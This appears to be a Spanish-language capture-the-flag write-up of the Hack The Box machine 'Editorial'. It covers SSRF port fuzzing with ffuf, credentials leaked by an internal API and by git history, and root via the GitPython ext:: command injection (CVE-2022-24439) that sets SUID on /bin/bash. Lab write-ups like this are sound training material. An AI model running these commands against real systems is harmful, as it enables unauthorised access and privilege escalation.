---
tags:
title: Editorial- Easy (HTB)
permalink: /Editorial-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Introduccion

`Editorial` es una máquina `Linux` de fácil dificultad que presenta una aplicación web de publicación vulnerable a `Server-Side Request Forgery (SSRF)`. Esta vulnerabilidad se aprovecha para obtener acceso a una API interna en ejecución, que luego se aprovecha para obtener credenciales que conducen al acceso `SSH` a la máquina. La enumeración del sistema revela aún más un repositorio de `Git` que se aprovecha para revelar credenciales para un nuevo usuario. El usuario `root` se puede obtener explotando [CVE-2022-24439](https://nvd.nist.gov/vuln/detail/CVE-2022-24439) y la configuración sudo.
# Reconocimiento

```bash
nmap -sCV -p22,80 10.129.252.207                                         
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-26 02:14 -03
Nmap scan report for 10.129.252.207
Host is up (0.39s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
|_  256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editorial.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.56 seconds
```

## Website / Port 80 

La web en si no tiene nada en la seccion principal.

![image-center](/assets/images/{FA462F89-FC05-497A-B44A-5E04F4B50BD1}.png)

## Upload section

En la seccion de `uploads` puedo tratar de subir un archivo `php` malicioso, pero ya hay algo q me llama la atencion y es el apartado donde puedo colocar una `url`, desde la que supuestamente se va a cargar el archivo que carguemos.
![image-center](/assets/images/{3878F0B3-3590-4E81-91E6-776941CFD504}.png)

### Testing SSRF (Server Side Request Forgery).

Ahora por ejemplo voy a tratar de hacer que cargue un recurso de mi maquina indicandole mi `ip`.

![image-center](/assets/images/{3261AC8E-C592-42CA-8507-15113407AE52}.png)

Y veo que desde mi servidor `python` recibo la peticion.

```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.252.207 - - [26/Nov/2025 02:30:54] "GET / HTTP/1.1" 200 -
```

Ya ahora puedo interceptar la petición del botón `Preview` con `burpsuite`. Por ejemplo intentando que cargue el propio index de la propia maquina `(localhost)`.

![image-center](/assets/images/{01602243-A34A-4491-975F-26674D69D3AE}.png)

En el `burpsuite` veo que interceptando esa petición, no me muestra nada, y al parecer carga una imagen la cual es la que aparece como logo al costado de la `url`.

![image-center](/assets/images/{F5ADCC4A-6202-47E7-91CD-3E5138CE8B26}.png)

Esto es muy raro ya que lo normal seria que cargue el propio recurso al que apunta el puerto `80`. Ademas es de notar que cuando el puerto suele ser correcto hay una diferencia muy grande en cuanto al tiempo de respuesta del servidor.

Cuando es correcta tarda aproximadamente..

![image-center](/assets/images/{D7A4A456-DE0D-4F8F-B482-C9E9532358C3}.png)

Y cuando no por ejemplo probando el payload 

```http
http://127.0.0.1:65535
```

Tarda esta cantidad de tiempo:

![image-center](/assets/images/{5DFAD29D-4C68-4D02-89FE-FB0CA54B80A9}.png)

Por lo que podria guardar esta peticion en un archivo y luego con `ffuf` poder fuzzear por numeros de puerto de la maquina los cuales esten abiertos internamente. Primero creo el archivo de la siguiente forma.

```bash
seq 1 65535 > num.txt
```

Y luego con ffuf hago el fuzzeo de puertos.

```bash
ffuf -u 'http://editorial.htb/upload-cover'' -request req.txt -w num.txt -t 150 -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://editorial.htb/upload-cover
 :: Wordlist         : FUZZ: /home/zsln/Desktop/zsln/htb/editorial/SSRFmap/num.txt
 :: Header           : Accept: */*
 :: Header           : Accept-Language: es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3
 :: Header           : Accept-Encoding: gzip, deflate, br
 :: Header           : Content-Type: multipart/form-data; boundary=----geckoformboundary2355dbdf08a568e7167e210cfac34c87
 :: Header           : Host: editorial.htb
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:145.0) Gecko/20100101 Firefox/145.0
 :: Header           : Origin: http://editorial.htb
 :: Header           : Connection: keep-alive
 :: Header           : Referer: http://editorial.htb/upload
 :: Header           : Priority: u=0
 :: Data             : ------geckoformboundary2355dbdf08a568e7167e210cfac34c87
Content-Disposition: form-data; name="bookurl"

http://127.0.0.1:FUZZ
------geckoformboundary2355dbdf08a568e7167e210cfac34c87
Content-Disposition: form-data; name="bookfile"; filename=""
Content-Type: application/octet-stream


------geckoformboundary2355dbdf08a568e7167e210cfac34c87--

 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 150
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

5000                    [Status: 200, Size: 51, Words: 1, Lines: 1, Duration: 357ms]
```

Como veo que me descubre el puerto `5000` puedo probar cual es la respuesta, y si es diferente puedo ver el contenido de la misma con `curl`.
### API 

![image-center](/assets/images/{7A4B4C7D-6BDB-41DA-A940-A15872C4C5D8}.png)

Como veo que en la respuesta ya no aparece el `.jpeg` puedo pensar que es distinta. Por lo que con `curl` ahora voy a ver su contenido.

```bash
 curl -s 'http://editorial.htb/static/uploads/3ac4bb30-9d3c-433f-8f0b-de83b4ca5302' | jq
{
  "messages": [
    {
      "promotions": {
        "description": "Retrieve a list of all the promotions in our library.",
        "endpoint": "/api/latest/metadata/messages/promos",
        "methods": "GET"
      }
    },
    {
      "coupons": {
        "description": "Retrieve the list of coupons to use in our library.",
        "endpoint": "/api/latest/metadata/messages/coupons",
        "methods": "GET"
      }
    },
    {
      "new_authors": {
        "description": "Retrieve the welcome message sended to our new authors.",
        "endpoint": "/api/latest/metadata/messages/authors",
        "methods": "GET"
      }
    },
    {
      "platform_use": {
        "description": "Retrieve examples of how to use the platform.",
        "endpoint": "/api/latest/metadata/messages/how_to_use_platform",
        "methods": "GET"
      }
    }
  ],
  "version": [
    {
      "changelog": {
        "description": "Retrieve a list of all the versions and updates of the api.",
        "endpoint": "/api/latest/metadata/changelog",
        "methods": "GET"
      }
    },
    {
      "latest": {
        "description": "Retrieve the last version of api.",
        "endpoint": "/api/latest/metadata",
        "methods": "GET"
      }
    }
  ]
}
```

## Shell as dev

Al parecer parece ser un servicio interno de una `api` y lo que ya me llama la atención es el `endpoint` : `/api/latest/metadata/messages/authors` donde puedo ver que tipo de mensajes y cuales mensaje les enviaron los `admins` de la pagina a los `autores` de lo libros.

Como al tratar de hacer una petición con `curl` a `http://editorial.htb/api/latest/metadata/messages/authors` veo que falla.

```bash
curl -s -X GET 'http://editorial.htb/api/latest/metadata/messages/authors' 
<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```

Puedo aprovecharme de el `SSRF` para poder hacer que la pagina me devuelva una ruta de `uploads` como antes y inspeccionarla con curl.

![image-center](/assets/images/{9557E9FF-D35B-4E5A-A45E-A1292079AEDA}.png)

Y ahora que tengo la ruta puedo ver el contenido.

```bash
curl -s 'http://editorial.htb/static/uploads/b5d0e482-f9e0-43d7-bb23-65e953c7aea3' | jq                  
{
  "template_mail_message": "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."
}
```

Como dentro del mensaje hay una credenciales para el usuario `dev`, puedo probar si las mismas son validas para un login via `ssh`.

```bash
ssh dev@editorial.htb                                
The authenticity of host 'editorial.htb (10.129.252.209)' can't be established.
ED25519 key fingerprint is: SHA256:YR+ibhVYSWNLe4xyiPA0g45F4p1pNAcQ7+xupfIR70Q
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'editorial.htb' (ED25519) to the list of known hosts.
dev@editorial.htb's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed Nov 26 06:43:05 AM UTC 2025

[..snip..]

Last login: Mon Jun 10 09:11:03 2024 from 10.10.14.52
dev@editorial:~$ 
```

```bash
dev@editorial:~$ cat user.txt 
7cc25d0324e936549c65a7c00af0ce6f
```

## Shell as prod

Enumerando el directorio de `dev` veo que tiene la ruta `apps/.git` con un repositorio. Por lo que puedo usar comando de git para ver los logs.

```bash
dev@editorial:~/apps/.git/logs$ git log --oneline
8ad0f31 (HEAD -> master) fix: bugfix in api port endpoint
dfef9f2 change: remove debug and update api port
b73481b change(api): downgrading prod to dev
1e84a03 feat: create api to editorial info
3251ec9 feat: create editorial app
```

Veo dos logs los cuales parecen interesantes, los cuales son `dfef9f2` y `b73481b`, El primero indica `change: remove debug and update api port`. Esto sugiere que se eliminó código o configuración de **depuración**, que a menudo incluye credenciales temporales o variables de entorno.

Por lo que tengo q ver y comparar las diferencias con el cambio anterior desde el cual el "parche" no estaba aplicado para ver que cual es el contenido. Para eso puedo usar `git show`.

```bash
dev@editorial:~/apps/.git$ git show b73481b
commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:55:08 2023 -0500

    change(api): downgrading prod to dev
    
    * To use development environment.

diff --git a/app_api/app.py b/app_api/app.py
index 61b786f..3373b14 100644
--- a/app_api/app.py
+++ b/app_api/app.py
@@ -64,7 +64,7 @@ def index():
 @app.route(api_route + '/authors/message', methods=['GET'])
 def api_mail_new_authors():
     return jsonify({
-        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
+        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
     }) # TODO: replace dev credentials when checks pass
 
 # -------------------------------
```

Es aca donde veo las nuevas credenciales del usuario `prod`, por lo que ahora migro a el como usuario .

```bash
su prod
Password: 
prod@editorial:/home/dev/apps/.git$
```

## Shell as root 

### Enumeration

Veo que tengo el privilegio de usar `python3` ejecutando el archivo `clone_prod_change.py` pasandole cualquier argumento.

```bash
prod@editorial:~/.local/bin$ sudo -l
[sudo] password for prod: 
Matching Defaults entries for prod on editorial:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User prod may run the following commands on editorial:
    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
```

### Analizing code 

Para entender bien que es lo que hace el script y ver si puedo abusar del mismo puedo inspeccionar su codigo.

```python
#!/usr/bin/python3

import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
```

Veo que usa la opción `-c protocol.ext.allow=always` permite el uso del protocolo `ext::` de Git, que puede ejecutar comandos arbitrarios del sistema, De manera que puedo ejecutar comandos de la siguiente forma.

```bash
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c whoami'
```

Probando.

```bash
prod@editorial:/opt/internal_apps/clone_changes$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c whoami'
Traceback (most recent call last):
  File "/opt/internal_apps/clone_changes/clone_prod_change.py", line 12, in <module>
    r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
  File "/usr/local/lib/python3.10/dist-packages/git/repo/base.py", line 1275, in clone_from
    return cls._clone(git, url, to_path, GitCmdObjectDB, progress, multi_options, **kwargs)
  File "/usr/local/lib/python3.10/dist-packages/git/repo/base.py", line 1194, in _clone
    finalize_process(proc, stderr=stderr)
  File "/usr/local/lib/python3.10/dist-packages/git/util.py", line 419, in finalize_process
    proc.wait(**kwargs)
  File "/usr/local/lib/python3.10/dist-packages/git/cmd.py", line 559, in wait
    raise GitCommandError(remove_password_if_present(self.args), status, errstr)
git.exc.GitCommandError: Cmd('git') failed due to: exit code(128)
  cmdline: git clone -v -c protocol.ext.allow=always ext::sh -c whoami new_changes
  stderr: 'Cloning into 'new_changes'...
fatal: protocol error: bad line length character: root
'
```

Veo que despues de todos los errores, veo el output de mi comando viendo que el usuario el cual se corre por detras es `root` lo cual es obvio ya que tengo el privilegio de ejecutar el scritp como cualquier usuario y con el comando `sudo` le indico que como root. Por lo que ahora puedo asignarle el bit `SUID` a la bash para luego convertirme en `root`.

Primero verifico los permisos de la misma.

```bash
prod@editorial:/opt/internal_apps/clone_changes$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1396520 Mar 14  2024 /bin/bash
```

Y ahora ejecuto mi comando. 
Aclaracion: el caracter `%` es usado por `git` como caracter de escape para los espacios.

```bash
prod@editorial:/opt/internal_apps/clone_changes$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c chmod% u+s% /bin/bash'
Traceback (most recent call last):
  File "/opt/internal_apps/clone_changes/clone_prod_change.py", line 12, in <module>
    r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
  File "/usr/local/lib/python3.10/dist-packages/git/repo/base.py", line 1275, in clone_from
    return cls._clone(git, url, to_path, GitCmdObjectDB, progress, multi_options, **kwargs)
  File "/usr/local/lib/python3.10/dist-packages/git/repo/base.py", line 1194, in _clone
    finalize_process(proc, stderr=stderr)
  File "/usr/local/lib/python3.10/dist-packages/git/util.py", line 419, in finalize_process
    proc.wait(**kwargs)
  File "/usr/local/lib/python3.10/dist-packages/git/cmd.py", line 559, in wait
    raise GitCommandError(remove_password_if_present(self.args), status, errstr)
git.exc.GitCommandError: Cmd('git') failed due to: exit code(128)
  cmdline: git clone -v -c protocol.ext.allow=always ext::sh -c chmod% u+s% /bin/bash new_changes
  stderr: 'Cloning into 'new_changes'...
fatal: Could not read from remote repository.

Please make sure you have the correct access rights
and the repository exists.
'
```

Y como puedo ver ahora la bash tiene el bit `SUID`.

```bash
prod@editorial:/opt/internal_apps/clone_changes$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1396520 Mar 14  2024 /bin/bash
```

Por lo que ahora ya puedo convertirme en `root` con el comando `bash -p`

```bash
prod@editorial:/opt/internal_apps/clone_changes$ bash -p 
bash-5.1# whoami
root
```

```bash
bash-5.1# cat /root/root.txt 
6cc496432d92be239245fa6790894db6
```

`~Happy Hacking.`

